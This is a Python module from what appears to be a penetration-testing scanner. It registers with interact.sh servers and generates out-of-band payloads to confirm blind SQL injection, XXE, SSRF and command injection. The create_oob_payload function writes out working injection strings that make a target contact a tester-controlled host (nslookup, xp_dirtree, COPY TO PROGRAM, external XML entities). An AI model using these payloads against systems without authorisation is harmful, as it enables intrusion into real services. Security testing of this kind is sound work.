"""
Out-of-Band (OOB) Testing Module

Confirms blind vulnerabilities (SQLi, SSRF, XXE, RCE) by observing an
out-of-band callback to a domain we control. A callback is strong evidence
the payload executed, which in-band response inspection cannot provide.

This module ships a real interact.sh client (self-registration + polling with
RSA/AES decryption). It requires the optional 'cryptography' package and
outbound network access to the interact.sh server. If either is unavailable
the client degrades to disabled and never reports a false confirmation.

Note: OOB testing is a standalone capability. It is not injected into the
default scan pipeline automatically — a caller drives it by generating a
payload, delivering it to the target, then polling for callbacks.
"""
import time
import random
import string
from typing import Dict, List, Optional


class InteractshClient:
    """Minimal, self-contained interact.sh client.

    Generates an RSA keypair, registers with a public interact.sh server, hands
    out unique OOB subdomains, and polls the server for interactions, decrypting
    each one with the locally held private key. A returned interaction is proof
    that something resolved/visited the unique subdomain embedded in a payload.
    """

    DEFAULT_SERVERS = ["oast.pro", "oast.live", "oast.site",
                       "oast.online", "oast.fun", "oast.me"]

    def __init__(self, logger, server: Optional[str] = None):
        self.logger = logger
        self.servers = [server] if server else list(self.DEFAULT_SERVERS)
        self.server: Optional[str] = None
        self.correlation_id: Optional[str] = None
        self.secret: Optional[str] = None
        self._private_key = None
        self.registered = False

    @staticmethod
    def _rand(n: int) -> str:
        return ''.join(random.choices(string.ascii_lowercase + string.digits, k=n))

    def register(self) -> bool:
        """Generate keys and register with the first reachable server.

        Returns True on success. On missing dependency or network failure it
        logs the reason and returns False (no exception, no false positive).
        """
        try:
            import base64
            import uuid
            import requests
            from cryptography.hazmat.primitives.asymmetric import rsa
            from cryptography.hazmat.primitives import serialization
        except ImportError as exc:
            self.logger.warning(
                f"[OOB] interact.sh client unavailable ({exc}); "
                f"install 'cryptography' and 'requests' to enable OOB polling"
            )
            return False

        self._private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
        public_pem = self._private_key.public_key().public_bytes(
            serialization.Encoding.PEM,
            serialization.PublicFormat.SubjectPublicKeyInfo,
        )
        public_b64 = base64.b64encode(public_pem).decode()
        self.correlation_id = self._rand(20)
        self.secret = str(uuid.uuid4())

        body = {
            "public-key": public_b64,
            "secret-key": self.secret,
            "correlation-id": self.correlation_id,
        }

        for server in self.servers:
            try:
                resp = requests.post(f"https://{server}/register", json=body, timeout=10)
                if resp.status_code == 200:
                    self.server = server
                    self.registered = True
                    self.logger.info(f"[OOB] Registered interact.sh listener on {server}")
                    return True
                self.logger.debug(f"[OOB] register on {server} returned {resp.status_code}")
            except requests.RequestException as exc:
                self.logger.debug(f"[OOB] register failed on {server}: {exc}")
                continue

        self.logger.warning("[OOB] Could not register with any interact.sh server")
        return False

    def new_domain(self) -> Optional[str]:
        """Return a fresh unique OOB domain bound to this registration.

        The correlation id is the leftmost label so the server can attribute
        callbacks back to this session; the random suffix distinguishes
        individual payloads.
        """
        if not self.registered:
            return None
        return f"{self.correlation_id}{self._rand(13)}.{self.server}"

    def poll(self) -> List[Dict]:
        """Poll the server and return decrypted interactions (possibly empty)."""
        if not self.registered:
            return []
        try:
            import base64
            import json
            import requests
            from cryptography.hazmat.primitives.asymmetric import padding
            from cryptography.hazmat.primitives import hashes
            from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
        except ImportError:
            return []

        try:
            resp = requests.get(
                f"https://{self.server}/poll",
                params={"id": self.correlation_id, "secret": self.secret},
                timeout=10,
            )
            if resp.status_code != 200:
                self.logger.debug(f"[OOB] poll returned {resp.status_code}")
                return []
            payload = resp.json()
        except (requests.RequestException, ValueError) as exc:
            self.logger.debug(f"[OOB] poll failed: {exc}")
            return []

        data = payload.get("data") or []
        aes_key_b64 = payload.get("aes_key")
        if not data or not aes_key_b64:
            return []

        try:
            aes_key = self._private_key.decrypt(
                base64.b64decode(aes_key_b64),
                padding.OAEP(
                    mgf=padding.MGF1(algorithm=hashes.SHA256()),
                    algorithm=hashes.SHA256(),
                    label=None,
                ),
            )
        except Exception as exc:  # decryption/padding errors are non-fatal
            self.logger.debug(f"[OOB] AES key decryption failed: {exc}")
            return []

        interactions: List[Dict] = []
        for item in data:
            try:
                raw = base64.b64decode(item)
                iv, ciphertext = raw[:16], raw[16:]
                decryptor = Cipher(algorithms.AES(aes_key), modes.CFB(iv)).decryptor()
                plaintext = decryptor.update(ciphertext) + decryptor.finalize()
                interactions.append(json.loads(plaintext.decode("utf-8", "ignore")))
            except Exception as exc:
                self.logger.debug(f"[OOB] interaction decryption failed: {exc}")
                continue
        return interactions


class OOBTester:
    """Builds OOB payloads and confirms callbacks.

    Two modes:
      * interact.sh mode (use_interactsh=True): self-registers a domain we can
        poll, so check_callbacks() returns real interactions.
      * External mode (oob_domain=...): uses a domain you already own (e.g. a
        Burp Collaborator domain). Payloads are generated, but callbacks must
        be checked on that external platform — this tool cannot poll it.
    """

    def __init__(self, logger, oob_domain: str = None, use_interactsh: bool = False):
        self.logger = logger
        self.pending_tests: Dict[str, Dict] = {}
        self.interactsh: Optional[InteractshClient] = None
        self.oob_domain = oob_domain

        if not oob_domain and use_interactsh:
            client = InteractshClient(logger)
            if client.register():
                self.interactsh = client
                self.oob_domain = client.new_domain()

        if not self.oob_domain:
            raise ValueError(
                "OOB testing needs a listener. Either pass an --oob-domain you "
                "control (e.g. a Burp Collaborator domain) or enable the built-in "
                "interact.sh client (requires the 'cryptography' package and network "
                "access). Get a free domain at https://app.interactsh.com"
            )

    def generate_unique_id(self) -> str:
        """Generate a unique identifier for a single OOB test."""
        return ''.join(random.choices(string.ascii_lowercase + string.digits, k=12))

    def create_oob_payload(self, test_id: str, vuln_type: str = 'sqli') -> str:
        """Create an OOB payload carrying a unique subdomain."""
        subdomain = f"{test_id}.{vuln_type}.{self.oob_domain}"

        payloads = {
            'sqli': [
                # MySQL
                f"' UNION SELECT LOAD_FILE('\\\\\\\\{subdomain}\\\\a') --",
                f"'; SELECT UTL_HTTP.REQUEST('http://{subdomain}') FROM DUAL --",
                # PostgreSQL
                f"'; COPY (SELECT '') TO PROGRAM 'nslookup {subdomain}' --",
                # MSSQL
                f"'; EXEC master..xp_dirtree '\\\\\\\\{subdomain}\\\\a' --",
            ],
            'xxe': [
                f'<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{subdomain}">]><foo>&xxe;</foo>',
                f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{subdomain}/xxe">]><foo>&xxe;</foo>',
            ],
            'ssrf': [
                f'http://{subdomain}',
                f'https://{subdomain}',
                f'file://{subdomain}',
            ],
            'rce': [
                f'`nslookup {subdomain}`',
                f'$(nslookup {subdomain})',
                f'; nslookup {subdomain} ;',
                f'| nslookup {subdomain}',
            ]
        }

        return payloads.get(vuln_type, [subdomain])[0]

    def _register_test(self, vuln_type: str, url: str, param: str = None) -> Dict:
        """Create a payload, record it as pending, and return its descriptor."""
        test_id = self.generate_unique_id()
        payload = self.create_oob_payload(test_id, vuln_type)
        self.pending_tests[test_id] = {
            'type': vuln_type,
            'url': url,
            'param': param,
            'payload': payload,
            'oob_domain': f"{test_id}.{vuln_type}.{self.oob_domain}",
            'timestamp': time.time(),
            'status': 'pending',
        }
        target = f"{url}?{param}=" if param else url
        self.logger.info(f"[OOB] Prepared {vuln_type.upper()} payload for {target}{payload[:50]}...")
        return dict(self.pending_tests[test_id], test_id=test_id)

    def test_sqli_oob(self, url: str, param: str) -> Optional[Dict]:
        """Prepare an OOB SQL injection payload for the given parameter."""
        return self._register_test('sqli', url, param)

    def test_xxe_oob(self, url: str) -> Optional[Dict]:
        """Prepare an OOB XXE payload."""
        return self._register_test('xxe', url)

    def test_ssrf_oob(self, url: str, param: str) -> Optional[Dict]:
        """Prepare an OOB SSRF payload for the given parameter."""
        return self._register_test('ssrf', url, param)

    def test_rce_oob(self, url: str, param: str) -> Optional[Dict]:
        """Prepare an OOB RCE payload for the given parameter."""
        return self._register_test('rce', url, param)

    def check_callbacks(self, timeout: int = 30, poll_interval: int = 5) -> List[Dict]:
        """Poll for OOB callbacks and correlate them to pending tests.

        In interact.sh mode this performs real polling and decryption, then
        matches each interaction back to the pending test whose unique id
        appears in the callback. Confirmed tests are returned and marked.

        In external mode (a domain you provided) this tool cannot poll the
        platform, so it logs where to look and returns an empty list.
        """
        if not self.interactsh:
            self.logger.warning(
                "[OOB] No pollable listener attached. Check your external OOB "
                "platform (e.g. Burp Collaborator) for callbacks to the generated "
                "subdomains."
            )
            return []

        confirmed: List[Dict] = []
        seen_full_ids = set()
        deadline = time.time() + max(poll_interval, timeout)

        while time.time() < deadline:
            for interaction in self.interactsh.poll():
                full_id = interaction.get('full-id') or interaction.get('unique-id') or ''
                if full_id in seen_full_ids:
                    continue
                seen_full_ids.add(full_id)

                blob = (full_id + ' ' + str(interaction.get('raw-request', ''))).lower()
                for test_id, test in self.pending_tests.items():
                    if test_id in blob and test['status'] != 'confirmed':
                        test['status'] = 'confirmed'
                        confirmed.append({
                            'test_id': test_id,
                            'type': test['type'],
                            'url': test['url'],
                            'param': test.get('param'),
                            'payload': test['payload'],
                            'protocol': interaction.get('protocol'),
                            'remote_address': interaction.get('remote-address'),
                            'callback_time': interaction.get('timestamp'),
                            'confidence': 'confirmed',
                            'evidence': (
                                f"Out-of-band {interaction.get('protocol', 'network')} "
                                f"callback received for unique subdomain {test_id} — "
                                f"confirms the payload executed"
                            ),
                        })
                        self.logger.info(
                            f"[OOB] ✅ Confirmed {test['type'].upper()} via "
                            f"{interaction.get('protocol', 'OOB')} callback (test {test_id})"
                        )

            if confirmed and len(confirmed) >= len(self.pending_tests):
                break
            time.sleep(poll_interval)

        if not confirmed:
            self.logger.info("[OOB] No out-of-band callbacks received within the polling window")
        return confirmed

    def get_oob_setup_instructions(self) -> str:
        """Return setup guidance for OOB testing."""
        return """
# Out-of-Band (OOB) Testing Setup

OOB testing confirms blind vulnerabilities by observing a callback (DNS/HTTP)
to a domain you control. A callback is strong evidence the payload executed.

## Built-in interact.sh client (self-registering)
Requires the 'cryptography' package and outbound network access.
The tool registers its own domain and polls for callbacks automatically.

## External listener (Burp Collaborator or your own domain)
Pass a domain you control with --oob-domain. Payloads are generated for you,
but you must check that platform for callbacks — the tool cannot poll it.

    pentestrr scan example.com --oob-domain abc123.burpcollaborator.net

## How it works
1. A unique subdomain is embedded in each payload.
2. If the target is vulnerable, it makes a DNS/HTTP request to that subdomain.
3. Receiving the callback confirms the vulnerability for that specific test.
   No callback means the OOB vector did not fire (it does not, by itself,
   prove the target is safe).

Supported OOB vectors: SQLi, SSRF, XXE, RCE.
"""


class BurpCollaborator:
    """Holder for a user-supplied Burp Collaborator domain.

    Burp Collaborator polling requires Burp's own client/API, which this tool
    does not embed. Use Burp's Collaborator client to view interactions.
    """

    def __init__(self, collaborator_domain: str):
        self.domain = collaborator_domain

    def get_domain(self) -> str:
        return self.domain
